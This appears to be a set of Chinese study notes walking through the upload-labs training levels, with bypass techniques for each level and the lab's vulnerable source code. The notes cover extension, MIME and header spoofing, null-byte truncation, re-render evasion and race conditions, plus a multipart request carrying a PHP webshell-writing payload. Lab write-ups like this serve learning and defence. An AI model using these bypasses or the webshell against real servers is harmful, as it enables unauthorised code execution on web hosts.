Less-1

```javascript
function checkFile() {
    var file = document.getElementsByName(' upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

file变量用来获取name标签为’upload_file’数组的第一个元素的值，，然后判断该变量如果为空则返回一个提示框。，又定义了一个用来获取上传文件类型的变量，截取了后缀名。然后如果上传了未定义的后缀名，那么将会报错，也就是实现了对我们上传文件的后缀名进行了验证。

- 删除前端代码

element编辑代码不会生效，因为chrome内存里加载原始代码，需要刷新重新加载，但是刷新会丢失对代码的修改。

因此两种方式：1.F12F1禁用js   2.override修改

- 上传图片马，bp改后缀变成php





Less-2

mime验证

- 上传图片马，bp修改文件类型
- 上传php马，bp修改content-type
- application/octet-stream----->image/jpeg





Less-3

不能上传php文件，因此尝试绕过

大小写未果，尝试特殊后缀解析，成功

php3,ph4,phpml



Less-4

bp抓包改成php. .

Less-5

同Less-4



Less-6

大小写



Less-7-3

Less-8-4

Less 9/10 same



Less-11

只检查一次-双写绕过



Less-12

上传一个jpg格式图片马，bp抓包，在upload/后面加上2.php%00

why???

### 00截断的原理

1.只能绕过前端验证（上传到服务器以后后缀还是php，还是会被过滤）

2.要想绕过后端，需要两个条件之一

- 路径拼接像上图的代码一样，直接使用的 $file_name这个文件名，而不是 $file_ext和其他什么东西来拼成一个文件名字，这时文件名中还是包含截断字符的，路径拼好之后可以被截断成想要的.php

```
$img_path=UPLOAD_PATH.'/'.$file_name;
```

- 文件的上传路径可控

可以修改路径拼接的path时，比如抓到的包中存在**path: uploads/**，就可以直接把路径构造成**uploads/xxx.php%00**，先构造一个存在截断字符的后缀“等着”真正的文件名，或者后缀名，截断之后的结果就是最终上传的结果。

eg bp上传抓包如下

```
------WebKitFormBoundaryRxKWcIParxysaZO8
Content-Disposition: form-data; name="save_path"

../upload/          //here！！！！！！！！！！！
------WebKitFormBoundaryRxKWcIParxysaZO8
Content-Disposition: form-data; name="upload_file"; filename="1.gif"
Content-Type: image/gif

<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["shell"])?>');?>
------WebKitFormBoundaryRxKWcIParxysaZO8
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryRxKWcIParxysaZO8--

```



Less-13

POST 00截断

由于%00不会自动解码，因此使用16进制添加

先upload/2.php_

然后hex模式找到2.php_（空格就是20）

20修改成00就行了



Less-14

文件头检测两位，根据源码文件头加上GIF98A就可以上传了



LESS-16

二次渲染

上传的源文件图片被imagecreatefrom(gif|png|jpg)()处理（取出原本的内容并且创建一个新文件，并且重命名）

使用16进制编辑器查看原本和上传处理之后的gif内容发现服务器上的文件末尾的php代码被图片渲染删除。

- gif渲染绕过--渲染前后没有变化的区域写入php木马

LESS-17

条件竞争，代码审计

```php
$is_upload = false;$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;
 
    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }}
```

服务器先保存上传的文件，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件。

存在逻辑缺陷：

保存->执行代码->删除上传木马

因此在删除前访问：

burp多线程发包，然后不断浏览器访问（删除之前访问），能够短暂的成功

Less-18

白名单不允许上传php--->使用图片马

文件上传之后文件被重命名----->重命名之前访问文件--burp多线程发包

图片马---配合文件包含，apache解析漏洞

Less-19

00截断

muma.php+png

把+二进制2b改成00截断即可